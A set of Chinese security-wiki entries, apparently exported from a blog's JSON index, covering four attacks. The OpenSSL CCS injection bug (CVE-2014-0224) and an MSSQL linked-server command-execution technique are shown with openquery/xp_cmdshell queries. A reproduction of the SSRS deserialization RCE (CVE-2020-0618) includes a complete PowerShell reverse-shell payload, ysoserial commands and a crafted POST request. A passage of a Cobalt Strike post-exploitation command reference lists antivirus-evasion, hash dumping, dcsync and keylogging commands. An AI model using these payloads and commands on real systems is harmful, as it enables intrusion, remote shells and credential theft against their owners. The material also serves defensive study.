SSL/TLS对于传输层的加密是通过动态密钥对数据进行加密实现的，而动态密钥则通过握手流程协商制定；为了保证动态密钥的安全性，其中使用公钥加密算法（非对称）、数字证书签名等手段。 一个SSL/TLS 握手过程需要协商的信息包括： 协议的版本号； 加密算法，包括非对称加密算法、动态密钥算法； 数字证书，传输双方通过交换证书及签名校验对彼此进行鉴权； 动态密钥，传输数据过程使用该密钥进行对称加解密，该密钥通过非对称密钥进行加密传输。 客户端和服务器之间的以下消息流描述了正常的TLS握手（标记为带星号的是可选的）： TLS消息流程图 简单说明流程图： 注意：握手协议作为SSL的一个子协议，在实现过程中是一个状态机。但握手协议中Change Cipher Spec（更改密钥规格）并不是一个握手消息，而是一个独立的TLS子协议类型。对此做法的官方解释是为了避免流水线推迟。OpenSSL中间人漏洞的发现者Masashi Kikuchi认为这种设计是漏洞成因之一。 客户端发出一个 Client Hello 消息，携带的信息包括： 所支持的SSL/TLS 版本列表；支持的与加密算法；所支持的数据压缩方法；随机数A; 服务端响应一个 Server Hello 消息，携带的信息包括： 协商采用的SSL/TLS 版本号；会话ID；随机数B；服务端数字证书 ServerCA； 由于双向认证需求，服务端需要对客户端进行认证，会同时发送一个 Client Certificate Request，表示请求客户端的证书； 客户端校验服务端的数字证书；校验通过之后发送随机数C，该随机数称为预主密钥（premaster key），使用服务器的数字证书中的公钥加密后发出； 由于服务端发起了 Client Certificate Request，客户端使用私钥加密一个随机数 ClientRandom随客户端的证书 ClientCA一并发出； 服务端校验客户端的证书，并成功将客户端加密的随机数ClientRandom 解密； 根据随机数A/随机数B/随机数C（premaster key）产生动态密钥（master-key），加密一个Finish 消息发至客户端； 客户端根据 同样的随机数和算法生成动态密钥（master-key），加密一个Finish 消息发送至服务端； 服务端和客户端分别解密成功，至此握手完成，之后的数据包均采用生成动态密钥（master-key）进行加密传输。 Client Key Exchange 消息说明 Client Key Exchange 消息包含用于生成密钥的最后一条加密信息：使用服务器的公钥加密的预主密钥（premaster key）。客户端生成的预主密钥（premaster key）只能由服务器解密，并防止中间人窃听。两端都使用预主密钥（premaster key）来生成主密钥（master key）。然后，将主密钥（master key）和公开可用的Client Hello和Server Hello的随机值A/随机值B，一起用作密钥扩展伪随机函数的输入，以生成密钥块。然后，将来自密钥块的字节分配给各种加密，解密，IV和MAC密钥，所有这些仅客户机和服务器共享。 Change Cipher Spec消息说明 注意Change Cipher Spec消息是如何使用的：客户端在收到服务器Hello Done消息后，生成预主密钥（premaster key），主密钥（master key）和最后的密钥块，发送Client Key Exchange消息，然后才发送Change Cipher Spec消息。服务器发送其Change Cipher Spec收到并验证来自客户端的Finished消息。在每一端，均使用Change Cipher Spec消息来初始化密码，并另一端所有其他TLS数据将受到刚刚协商的密码的保护。 双向认证和单向认证说明 双向认证更好的解决了身份冒充问题，服务端提供证书的同时要求对客户端身份进行认证；但是在一些常见的应用场景下往往只有单向认证，如采用https网站只需要求客户端（浏览器）对服务端的证书进行认证。 在单向认证场景下，握手阶段2服务端不会发出 Client Certificate Request，之后服务端也不需要校验客户端证书； 在双向认证场景下，客户端如果无法提供证书，会发出 no digital certificate alert 的警告信息，此时可能导致握手失败； 随机数的使用说明 由于数字证书是静态的，因此要求使用随机因素来保证协商密钥的随机性；对于RSA 算法来说，预主密钥（premaster key）本身就是一个随机数，再加上Hello消息中的随机数，三个随机数通过一个密钥导出器最终导出一个对称密钥。 之所以采用 预主密钥（premaster key）机制是因为SSL协议不信任每个主机都能产生完全随机的随机数，如果预主密钥（premaster key）不随机，那么被猜出来的风险就很大，于是仅仅使用 预主密钥（premaster key）作为密钥不合适，需要引入新的随机因素，也就是同时结合hello消息中的双向随机数。 会话密钥重用说明 SSL/TLS握手过程比较繁琐，同时非对称加解密性能比对称密钥要差得多；如果每次重建连接时都需要进行一次握手会产生较大开销，因此有必要实现会话的重用以提高性能。 常用的方式包括： SessionID(RFC 5246)，客户端和服务端同时维护一个会话ID和会话数据状态；重建连接时双方根据sessionID找到之前的会话密钥实现重用； SessionTicket(RFC 5077)，由服务端根据会话状态生成一个加密的ticket，并将key也发给客户端保证两端都可以对其进行解密。该机制相较sessionID的方式更加轻量级，服务端不需要存储会话状态数据，可减轻一定压力。 证书的校验说明 检查数字签名； CA链授权检查； 证书过期及激活时间检查； SSL/TLS协议握手过程SSL的握手过程严格说是SSL协议的子协议，RFC5246(SSL V1.2）分为三个子协议，握手协议，记录协议（加密传输数据）和告警协议（用于告警和关闭连接）。握手过程实际就是握手协议的内容。 下图为一个单向认证的握手过程，13为客户端，55为服务端。 一、客户端向服务端发送 Client Hello 支持的协议版本，比如TLS 1.2 支持的加密算法(Cipher Suties) 客户端生成的随机数A 二、服务端向客户端发送 Server Hello 确认使用的协议版本 服务器生成的随机数B session id 确认使用的加密算法 Certificate服务器证书 Server Key Exchange如果是DH算法，这里发送服务器使用的DH参数。RSA算法不需要这一步。 Server Hello Done Server Hello结束。因为采用单向认证所以没有Certificate Request 三、客户端向服务端发送 Client Key Exchange 包含预主密钥（premaster key）。客户端生成第三个随机数。如果是采用RSA算法，会生成一个48字节随机数，然后用服务端的公钥加密之后再放入报文中；如果是DH算法，这里发送的就是客户端的DH参数，之后服务器和客户端根据DH算法，各自计算出相同的预主密钥（premaster key）。因为采用单向认证，所以不会发送Certificate Verify消息。 Change Cipher Spec 客户端通知服务器开始使用加密方式发送报文。客户端使用上面的3个随机数client random, server random, premaster key, 计算出48字节的主密钥master secret, 这个就是对称加密算法的密钥。 Finished 客户端发送第一个加密报文。使用HMAC算法计算收到和发送的所有握手消息的摘要，然后通过RFC5246中定义的一个伪函数PRF计算出结果，加密后发送。Finished是上图的Encrypted Handshake Message。 四、服务端向客户端发送 服务器端发送Change Cipher Spec和Finished消息，到这里握手结束。 OpenSSL中间人漏洞OpenSSL中间人漏洞（CVE-2014-0224）。 该漏洞是由于在处理Change Cipher Spec消息时的OpenSSL方法存在缺陷。 未经身份验证的中间人攻击者可以通过使用特制握手强制使用弱密钥来利用此漏洞。 成功的利用将使攻击者能够解密流量并将纯文本注入TLS连接。 漏洞影响版本： OpenSSL Project OpenSSL prior to 0.9.8za OpenSSL Project OpenSSL prior to 1.0.0m OpenSSL Project OpenSSL prior to 1.0.1h 远程未经身份验证的中间人（MITM）攻击者可以利用此漏洞来解密和注入流量。当OpenSSL客户端和服务器尝试执行TLS握手时，中间人（MITM）会拦截并将Client Hello转发到服务器。攻击者然后从服务器截获Server Hello，服务器Certificate和Server Hello Done消息，再将Server Hello消息转发到客户端，然后在转发服务器 Certificate和Server Hello Done消息之前，注入Change Cipher Spec消息。 注意：也有可能在服务器Certificate之后，但在Server Hello Done之前发送Change Cipher Spec记录消息。 客户端在收到这些Change Cipher Spec消息后会初始化弱密码（主密钥为空），并以Client Key Exchange，Change Cipher Spec和Finished消息进行响应。在将Client Key Exchange和Finished的消息发送到服务器之前，中间人（MITM）再次拦截这些消息，并注入自己的Change Cipher Spec记录消息。当服务器在Client Key Exchange之前收到中间人（MITM）发送的Change Cipher Spec消息时，它会初始化相同的弱密码（主密钥为空），然后处理Client Key Exchange消息以更新其主密钥，并最终计算正确的verify_data，处理Finished消息。然后，服务器使用自己的Change Cipher Spec和Finished消息作为响应，中间人（MITM）将其拦截，重新加密并转发给客户端。客户端接受这些消息，从而使用可公开计算的密码与服务器建立TLS会话，攻击者可利用该密码解密数据或注入有效的加密数据流，进行会话劫持。 注意：在上述攻击情形中，中间人（MITM）攻击者需要使用弱密码对通常为纯文本消息（例如Server Hello Done，Client Key Exchange等）进行加密，然后再将它们从一端转移到另一端。 漏洞触发条件 目标客户端和服务器必须已安装并正在运行该产品的易受攻击的版本。 攻击者必须能够拦截数据包并将其注入目标主机之间的传输层连接中。 中间攻击者的人将来自客户端的Client Hello数据包转发到服务器。 然后，攻击者从服务器截获Server Hello，Certificate和Server Hello Done消息，并在转发Server Hello之后，在Server Certificate和Server Hello Done消息之前，发送恶意的Change Cipher Spec记录。 然后，攻击者拦截客户端的Client Key Exchange，Change Cipher Spec和Finished消息，然后向服务器发送恶意的Change Cipher Spec记录，然后发送Client Key Exchange和Finished消息。 然后，攻击者拦截并加密服务器的Change Cipher Spec和Finished消息，发送到客户端，从而成功建立了具有弱密码的TLS会话。 漏洞触发流程客户端向服务器发送Client Hello。 中间人（MITM）将其转发到服务器： 1[Client] ------------&gt; [MITM] -----------&gt; [Server] 服务器向中间人（MITM）发送Server Hello，Certificate 和 Server Hello Done： 1[Client] [MITM] &lt;----------- [Server] 中间人（MITM）转发Server Hello，注入Change Cipher Spec，并将服务器Certificate和Server Hello Done发送给客户端： 1[Client] &lt;------------ [MITM] [Server] 客户端向中间人（MITM）发送 Client Key Exchange，Change Cipher Spec和Finished消息： 1[Client] ------------&gt; [MITM] [Server] 中间人（MITM）将Change Cipher Spec，Client Key Exchange和Finished消息发送到服务器 1[Client] [MITM] ------------&gt; [Server] 服务器发送其Change Cipher Spec和Finished消息，而中间人（MITM）会将其加密并发送给客户端： 1[Client] &lt;------------ [MITM] &lt;------------ [Server] 数据包分析230为客户端，206为中间人，164为服务器，整个中间人劫持流程配合数据包分析如下： 客户端（230）发送Client Hello。 中间人（206）截获了它； 中间人（206）将Client Hello转发到服务器（164）； 服务器（164）发送Serve Hello， Certificate和Server Hello Done响应， 中间人（206）截获了它； 中间人（206）将Server Hello，恶意Change Cipher Spec和（加密的） Certificate以及（加密的）Server Hello Done发送给客户端（230）： 客户端（230）发送Client Key Exchange，Change Cipher Spec和（加密的）Finished消息，中间人（206）截获了它。 中间人（206）发送恶意的Change Cipher Spec，然后发送（加密的）Client Key Exchange和（加密的）Finished消息： 服务器（164）以Change Cipher Spec和（已加密）Finished消息作为响应，中间人（206）截获了它： 中间人（206）向客户端（230）发送（加密的）Change Cipher Spec和（加密的）Finished消息。 整个劫持流程结束。 分析客户端（230）与中间人（206）的通信。 客户端（230）发送Client Hello给中间人（206）； 中间人（206）将Server Hello，恶意Change Cipher Spec和（加密的） Certificate以及（加密的）Server Hello Done发送给客户端（230）； 客户端（230）发送Client Key Exchange，Change Cipher Spec和（加密的）Finished消息给中间人（206）； 中间人（206）向客户端（230）发送（加密的）Change Cipher Spec和（加密的）Finished消息； 之后中间人（206）开始发送Application Data给客户端（230）。 下图是客户端（230）与中间人（206）通信与正常的SSL协议握手过程的对比图。 明显可以发现，客户端（230）与中间人（206）的通信中缺少服务器发送的Certificate和Server Key Exchange和Server Hello Done的消息。因为中间人（206）截获消息向服务器发送了恶意Change Cipher Spec在Server Hello之后，在服务器Certificate和Server Hello Done消息之前。所以无需Server Key Exchange，让服务器强制使用空密钥生成之后的对称密钥。而且，中间人（206）已经使用Client Hello和Server Hello的随机值与空预主密钥生成之后的对称密钥，来加密 Certificate和Server Hello Done并发送给客户端（230）。所以，在数据包中体现为Encrypted Handshake Message类型消息。 分析中间人（206）与服务器（164）的通信。 中间人（206）将Client Hello转发到服务器（164）； 服务器（164）发送Serve Hello， Certificate和Server Hello Done响应给中间人（206）； 中间人（206）发送恶意的Change Cipher Spec，然后发送（加密的）Client Key Exchange和（加密的）Finished消息； 服务器（164）以Change Cipher Spec和（已加密）Finished消息作为响应给中间人（206）； 之后服务器（164）开始发送Application Data给中间人（206）。 下图是中间人（206）与服务器（164）的通信与正常的SSL协议握手过程的对比图。 明显可以发现，中间人（206）与服务器（164）的通信缺少客户端发送的Client Key Exchange的消息。因为中间人（206）截获消息向服务器发（164）送了恶意Change Cipher Spec，中间人（206）只需Client Hello和Server Hello的随机值与空预主密钥生成之后的对称密钥。利用生成的对称密钥加密发送Client Key Exchange和客户端（203）的Finished消息。在数据包中体现为Encrypted Handshake Message类型消息。 漏洞分析​ OpenSSL中存在一个安全绕过漏洞。该漏洞存在于处理OpenSSL客户端和服务端上的Change Cipher Spec消息。 ​ 握手协议作为SSL的一个子协议，在实现过程中是一个状态机。但握手协议中Change Cipher Spec（更改密钥规格）并不是一个握手消息，而是一个独立的TLS子协议类型。对此做法的官方解释是为了避免流程推迟。该漏洞的发现者Masashi Kikuchi认为这种设计是漏洞成因之一。 ​ 在整个握手协议中，也没有强制对Change Cipher Spec的发送顺序做任何校验，那么中间人攻击者有机会在握手过程中的任何时机插入Change Cipher Spec消息。一种可能的攻击方法就是，在计算出master、生成对称密钥之前，就插入Change Cipher Spec消息。这将导致消息接收方以全空的主密钥生成对称密钥。那么中间人有机会完全窃听通信过程中的加密数据。 ​ ssl3_read_bytes（）用于处理传入的数据。收到Change Cipher Spec类型的数据时，ssl3_read_bytes（）首先检查s-&gt; s3-&gt; tmp.new_cipher（用于临时存储密码参数的结构）是否为NULL，如果未设置，则设置s-&gt; s3-&gt; change_cipher_spec并调用ssl3_do_change_cipher_spec（ ）。每当接收到ChangeCipherSpec消息时，便会执行此操作。 ​ ssl3_do_change_cipher_spec（）首先检查临时密码的密钥块s-&gt;s3-&gt;tmp.key_block是否为NULL，如果是，则继续使用ssl3_generate_key_block（）或tls1_generate_key_block（）的setup_key_block（）从主密钥，Client Hello，Server Hello的随机值计算密钥块。 ​ 这两个函数都使用s-&gt; session-&gt; master_key（已初始化为0）作为其主密钥，因此最终仅基于Client Hello和Server Hello随机值生成密钥块。 ​ 在正常的情况下，如此类握手，在客户端和服务器双方进行验证后，TLS握手立即终止时，Finished消息（包含已交换的所有握手消息的verify_data中包含散列）都将不一致。但是，当客户端和服务器都使用易受攻击的OpenSSL库时，它们最终将根据正确的主密钥计算并验证客户端和服务器的Finished消息的verify_data哈希。 ​ 在客户端上，这是因为在处理多个Change Cipher Spec消息时，ssl3_do_change_cipher_spec（）每次都会调用final_finish_mac（）来计算其Finished消息。 收到所有必要的加密信息（特别是服务器Certificate消息）后，客户端将计算其预主密钥（premaster key）和主密钥（master key）并更新其s-&gt; session-&gt; master_key。 任何后续的Change Cipher Spec消息都会导致使用新的主密钥（master key）为已保存的握手消息计算verify_data。 ​ 在服务器端，当从ssl3_do_change_cipher_spec（）接收到Change Cipher Spec时，以及从函数ssl3_get_cert_verify（）接收到客户端的Finished消息时，都调用了final_finish_mac（），该函数调用ssl3_get_message（），该函数会重新计算带有验证信息的主密钥（master key）。 ​ 由于Change Cipher Spec不是握手消息，而是具有自己的记录，因此它不参与verify_data的计算，因此可以注入到流中。如上所述，即使使用空的主密钥（master key），Finished消息中的verify_data也将排队等待验证，并且TLS会话也将使用弱主密钥（master key）来建立。 [1] http://tools.ietf.org/html/rfc4346[2] http://tools.ietf.org/html/rfc5246 参考资料","tags":[{"name":"OpenSSL","slug":"OpenSSL","permalink":"http://example.com/tags/OpenSSL/"}],"categories":[{"name":"漏洞相关","slug":"漏洞相关","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"name":"OpenSSL","slug":"漏洞相关/OpenSSL","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/OpenSSL/"}]},{"title":"BID-23649_SQL Server链接爬网命令执行漏洞","date":"2021-07-06T06:44:33.000Z","path":"wiki/漏洞相关/MSSQL/BID-23649-Microsoft-SQL-Server-数据库链接爬网命令执行漏洞/","text":"漏洞信息漏洞名称 漏洞名称：Microsoft SQL Server 数据库链接爬网命令执行漏洞 CVE编号：暂无 CNVD编号：暂无 Bugtraq 编号：23649 漏洞类型：代码执行 漏洞概述​ Microsoft SQL Server 数据库链接爬网命令执行漏洞。远程攻击者利用，数据库链接查询功能无凭证要求特点，通过openquery()函数，执行远程代码。 ​ msf脚本公开于2012/12/25 漏洞影响​ Microsoft SQL Server 2000 2005 解决方案​ 暂无 漏洞复现​ 在win 7 上部署 mssql 2005，并配置开启远程连接。 ​ kali上使用msf 1use exploit/windows/mssql/mssql_linkcrawler ​ 最终反弹shell成功。 漏洞分析​ Database Link 数据库链接的作用是，允许一个数据库服务器去对其他的数据库服务器进行查询，通常配置此功能会使数据库服务器，拥有过多的特权。使用openquery()函数，对被链接的数据库服务器进行查询；也可以执行xp_cmdshell，对远程访问也无凭证要求。 ​ 通常情况下链接的数据库服务器的部署图如下： ​ 列出所有链接的服务器名，通常有两个选项 1sp_linkedservers ​ 和 1SELECT srvname FROM master..syservers ​ 查询一个服务器的所有链接的服务器名： 1SELECT srvnaem From openquery(DB1, &#x27;select srvname FROM master..sysservers&#x27;) ​ 查询一个服务器的某个链接的服务器所链接的服务器名： 1SELECT srvnaem From openquery(DB1, &#x27;select srvname FROM openquery(HVA, &quot;SELECT srvname FROM master..syservers&quot;)&#x27;) ​ 查询可以一直嵌套执行，直到穷尽所有数据库服务器。 ​ 在链接的服务器上执行命令： 1SELECT * FROM openquery(DB1, &#x27;SELECT * FROM openquery(HVA, &quot;SELECT 1; exec xp_cmdshell&#x27;&quot;&#x27;ping 192.168.1.1&quot;&quot; &#x27;&#x27;)&#x27;) 参考资料 https://www.exploit-db.com/exploits/23649 https://www.slideshare.net/nullbind/sql-server-exploitation-escalation-pilfering-appsec-usa-2012","tags":[{"name":"MSSQL","slug":"MSSQL","permalink":"http://example.com/tags/MSSQL/"}],"categories":[{"name":"漏洞相关","slug":"漏洞相关","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"name":"MSSQL","slug":"漏洞相关/MSSQL","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/MSSQL/"}]},{"title":"CVE-2020-0618_SQL Server Reporting Services远程代码执行漏洞","date":"2021-07-06T06:37:18.000Z","path":"wiki/漏洞相关/MSSQL/CVE-2020-0618-Microsoft-SQL-Server-Reporting-Services远程代码执行漏洞/","text":"漏洞信息漏洞名称 漏洞名称：Microsoft SQL Server Reporting Services远程代码执行漏洞 CVE编号：CVE-2020-0618 CNVD编号：CNVD-2020-10449 BID编号：暂无 漏洞类型：代码执行 漏洞概述​ Microsoft SQL Server Reporting Services存在远程代码执行漏洞。攻击者可以利用该漏洞利用序列化的对象编写HTTP POST请求，以实现远程代码执行。该漏洞是由于序列化的Blob未由服务器签名而造成的。（Blob 对象表示一个不可变、原始数据的类文件对象。） 漏洞影响Microsoft SQL Server 2012 for 32-bit Systems Service Pack 4Microsoft SQL Server 2012 for x64-based Systems Service Pack 4Microsoft SQL Server 2014 Service Pack 3 for 32-bit SystemsMicrosoft SQL Server 2014 Service Pack 3 for 32-bit SystemsMicrosoft SQL Server 2014 Service Pack 3 for x64-based SystemsMicrosoft SQL Server 2014 Service Pack 3 for x64-based SystemsMicrosoft SQL Server 2016 for x64-based Systems Service Pack 2Microsoft SQL Server 2016 for x64-based Systems Service Pack 2 解决方案 1.使用SQL Server 2012-2016的用户请尽快安装相关补丁 2.使用SQL Server 2008的用户请为数据库设置强口令，或者将Reporting Services监听ip改为本地。暂时禁用外部连接，保证此服务安全。 漏洞复现1、Windows Server 2016 Datacenter（https://msdn.itellyou.cn/）2、SQL Server 2016 Developer Edition x64（https://msdn.itellyou.cn/） 链接:https://pan.baidu.com/s/1lgI_OoayhbFyYF8Hm-XCEw提取码:gsl1 3、Postman-win64-7.22.1（https://www.postman.com/）4、netcat-1.11（https://eternallybored.org/misc/netcat/）5、ysoserial-1.32（https://github.com/pwntester/ysoserial.net） SQL server 2016安装​ SQL Server 2016 Developer Edition x64安装过程如下图，其中需要额外注意的步骤已用红色圈出，其他步骤下一步即可 ​ 出现漏洞的服务为Reporting Services，此服务默认情况下并不安装，需要用户安装时手动安装。 ​ 选择混合模式并设置sa的密码123456； ​ 点击安装即可。 配置 Reporting Services​ 安装并配置完sql server及reporting services，启动“Reporting Services 配置管理器”，如下图 ​ 点击“连接”进入配置管理器，如下图表示成功启动； ​ 重点访问 http://localhost/ReportS，创建分页报表，提示需要安装报表服务器。 ​ 安装好报表服务器后，新建一个报表； ​ 输入前面设置的账号sa和密码 。 ​ 保存，点击运行； ​ 访问一下漏洞路径http://10.251.0.34/ReportServer/pages/ReportViewer.aspx，成功。 漏洞复现​ 安装并启动BurpSuite，发送方式POST，地址 1http://10.251.0.34/ReportServer/pages/ReportViewer.aspx ​ Body中填入 123NavigationCorrector$PageState=NeedsCorrectionNavigationCorrector$ViewState=payload（payload生成方式下面会讲述）__VIEWSTATE= ​ 注意此处如果不配置Authorization，发送后会返回401 unauthorized； ​ NTLM凭据基于在交互式登录过程中获得的数据，并且由域名，用户名和用户密码的单向哈希组成。当应用程序使用NTLM身份验证时，需要配置Burp Suite以自动执行身份验证过程。 ​ 可以在用户选项&gt;连接&gt;平台身份验证中配置这些设置。使用添加功能来配置新的凭据。 ​ payload生成方式，在powershell中依次执行如下4条命令： 1234567$command = &#x27;$client = New-Object System.Net.Sockets.TCPClient(&quot;10.251.0.34&quot;,6666);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 =$sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&#x27;$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)$encodedCommand = [Convert]::ToBase64String($bytes).\\ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c &quot;powershell.exe -encodedCommand $encodedCommand&quot; -o base64 | clip ​ 将第1条命令中的ip地址和端口改为你的nc监听的地址和端口，执行完上述4条命令后，payload会复制到剪贴板，直接粘贴到上述的payload位置。 ​ 使用burpsuite执行发包。 ​ kali开启nc监听端口，反弹shell成功。 漏洞分析​ SQL Server Reporting Services（SSRS）提供了一组本地工具和服务，用于创建，部署和管理移动报告和分页报告。 ​ SSRS Web应用程序中的功能允许低特权用户帐户通过利用反序列化问题在服务器上运行代码。 只有授权用户才能访问该应用程序，但是最低权限（浏览器角色）也可利用此漏洞。 ​ 漏洞出现在ReportingServicesWebServer.dll中，此文件位于SQL Server安装目录下Reporting ServicesReportServerbin，出现问题的函数是Microsoft.Reporting.WebForms.BrowserNavigationCorrector中的OnLoad方法。 1234567891011121314rotected override void OnLoad(EventArgs e)&#123; base.OnLoad(e); this.EnsureChildControls(); if (this.Page.IsPostBack &amp;&amp; string.Equals(this.m_pageState.Value, &quot;NeedsCorrection&quot;, StringComparison.Ordinal)) &#123; string value = this.m_viewerViewState.Value; if (!string.IsNullOrEmpty(value)) &#123; LosFormatter losFormatter = new LosFormatter(); object obj = null; try &#123; obj = losFormatter.Deserialize(value); 可以看到此处使用LosFormatter类直接将value进行反序列化处理产生的漏洞， ​ 该BrowserNavigationCorrector类的实例化并且调用的位置在Microsoft.ReportingServices.WebServer.ReportViewerPage中的OnInit方法 1234567891011protected override void OnInit(EventArgs e)&#123; base.OnInit(e); ReportViewerHost reportViewer = this.ReportViewer; reportViewer.EnableHybrid = this.ShowHybrid; if (reportViewer != null) &#123; PageRequestManagerErrorHandler child = new PageRequestManagerErrorHandler(); reportViewer.Parent.Controls.AddAt(reportViewer.Parent.Controls.IndexOf(reportViewer), child); BrowserNavigationCorrector child2 = reportViewer.CreateNavigationCorrector(); reportViewer.Parent.Controls.AddAt(reportViewer.Parent.Controls.IndexOf(reportViewer), child2); ​ 通过此处可以定位到路由为ReportServer/pages/ReportViewer.aspx ​ 可以通过本地 SharePoint服务器中的/ReportServer/pages/ReportViewer.aspx页面来触发此功能。 概念验证可以将以下HTTP请求发送到服务器以利用该应用程序： 123456POST /ReportServer/pages/ReportViewer.aspx HTTP/1.1Host: targetContent-Type: application/x-www-form-urlencodedContent-Length: XNavigationCorrector$PageState=NeedsCorrection&amp;NavigationCorrector$ViewState=[PayloadHere]&amp;__VIEWSTATE= 可以在PowerShell中使用以下命令来使用ysoserial.net工具生成有效负载： 1234567$command = &#x27;$client = New-Object System.Net.Sockets.TCPClient(&quot;10.251.0.33&quot;,6666);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 =$sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&#x27;$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)$encodedCommand = [Convert]::ToBase64String($bytes).\\ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c &quot;powershell.exe -encodedCommand $encodedCommand&quot; -o base64 | clip 参考资料 https://nvd.nist.gov/vuln/detail/CVE-2020-0618 http://packetstormsecurity.com/files/156707/SQL-Server-Reporting-Services-SSRS-ViewState-Deserialization.html https://portal.msrc.microsoft.com/zh-CN/security-guidance/advisory/CVE-2020-0618 https://www.mdsec.co.uk/2020/02/cve-2020-0618-rce-in-sql-server-reporting-services-ssrs/ https://social.msdn.microsoft.com/Forums/sqlserver/en-US/b3145fc2-7c9c-41f4-9cd3-e1ba3ed2b708/reporting-services-web-portal-error-the-report-server-was-unable-to-validate-the-integrity-of?forum=sqlreportingservices https://xz.aliyun.com/t/7891 https://blog.csdn.net/qq_40989258/article/details/105344344","tags":[{"name":"MSSQL","slug":"MSSQL","permalink":"http://example.com/tags/MSSQL/"}],"categories":[{"name":"漏洞相关","slug":"漏洞相关","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"name":"MSSQL","slug":"漏洞相关/MSSQL","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/MSSQL/"}]},{"title":"1-Cobalt Strike基础中篇","date":"2021-07-03T03:35:16.000Z","path":"wiki/威胁猎捕/Cobalt Strike/1-Cobalt-Strike基础中篇/","text":"[TOC] by Tahir 2021.6.8 接着基础上篇 4.后渗透4.1 会话管理4.1.1 Beacon 的管理Beacon 控制台 在一个 Beacon 会话上右击 interact（交互）即可打开 Beacon 控制台，如果想对多个会话进行控制，也只需选中多个会话，执行相关功能即可。 在 Beacon 的控制台中的输入与输出之间，是一个状态栏，状态栏上的信息分别是：目标 NetBIOS 名称、用户名、会话PID以及 Beacon 最近一次连接到 CS 团队服务器的时间。 Beacon 控制台是在使用 CS 的过程中，很经常用到的功能，向 Beacon 发出的每个命令，都可以在这里看到，如果队友发送了消息，在 Beacon 控制台同样能看到，消息前还会显示队友的名称。 Beacon 菜单 Access：包含了一些对凭据的操作及提权的选项 Explore：包含了信息探测与目标交互的选项 Pivoting：包含了一些设置代理隧道的选项 Session：包含了对当前 Beacon 会话管理的选项 Beacon 命令 12help 帮助命令显示全部命令help xxx 显示某个命令的详细信息 1234argue 进程参数欺骗argue [command] [fake arguments]argue 命令 假参数 欺骗某个命令参数argue [command]argue 命令 取消欺骗某个命令参数利用这个也可以绕过360添加用户（非核晶模式非x86）比如:argue net1 /hello /hello /hello /hello /hellorun net1 user admin 123451 /add注：假参数需要比真命令长 123blockdlls 阻止子进程加载非微软签名的dllblockdlls [start|stop]blockdlls start 启动此策略blockdlls stop 关闭此策略启动此策略后创建的子进程加载非微软签名的dll时会被阻止注：此特性是windows10自身特性，需要目标为windows10才能成功启用 123browserpivot 浏览器代理前面介绍过browserpivot [pid] [x86|x64]browserpivot [stop] 12cancel 取消正在进行的文件下载cancel filename 1cd 切换目录 1checkin 强制回连时发送主机信息 12covertvpn 部署Covert VPN客户端，注：没啥用的功能不做介绍covertvpn [interface] [ip address] 1clear 清空Beacon任务列队 12connect 连接到一个TCP Beaconconnect [target] [port] 1cp 复制文件 123dcsync 从域控中提取密码哈希dcsync [DOMAIN.FQDN] 提取所有帐户的密码哈希dcsync [DOMAIN.FQDN] [DOMAIN\\user] 特定用户的 123desktop VNC远程桌面desktop pid [x86|x64] low|high 将vnc服务dll注入到指定进程中运行注：需要确保cs服务端有vnc dll 123dllinject 反射dll进程注入dllinject pid dllpath注：路径为本机路径 123dllload 使用LoadLibrary函数进行dll注入dllload pid dllpath 注：LoadLibrary函数 dll注入，目标机上必须存在被注入的dll 12download 下载目标机文件download filepath 1downloads 列出正在下载的文件 1drives 列出目标机上所有的磁盘盘符 12elevate 提权并生成一个高权限会话elevate [exploit] [listener] 12execute 执行程序（无回显）execute [program] [arguments] 123execute-assembly 内存加载执行.NET程序集execute-assembly .netpath [arguments]注：就是普通的内存加载执行.net程序 1exit 结束Beacon进程 12getprivs 启用当前访问令牌所拥有的特权注：你可以通过shell whoami /all查看详细信息 1getsystem 尝试模拟一个SYSTEM账号的令牌获取System权限 1getuid 获取当前令牌关联的用户ID 1hashdump 转储密码哈希 12inject 在指定进程中派生会话inject [pid] &lt;x86|x64&gt; [listener] 123inline-execute 在Beacon会话中执行Beacon Object File (BOF)inline-execute [/path/to/file.o] [args]注：后面会详细讲解 1234jobs 查看后渗透任务列表Beacon中有些功能会在其他进程中运行（例如键盘记录屏幕截图）这些任务在后台中运行，并在可用时报告其输出可以使用jobs查看Beacon中的所有任务 12jobkill 结束一个在后台运行jobkill [JID] 123jump 在远程主机上执行payload生成一个会话jump [exploit] [target] [listener]此命令通过横向渗透在目标上执行payload生成会话(psexec winrm) 123kerberos_ticket_purge 清除当前shell的Kerberos票据kerberos_ccache_use 从ccache文件中导入Kerberos票据kerberos_ccache_use [/path/to/file.ccache]kerberos_ticket_use 从ticket文件中导入Kerberos票据kerberos_ticket_use [/path/to/file.ticket]注：域渗透相关 123keylogger 将键盘记录器注入到一个进程运行keylogger [pid] [x86|x64] 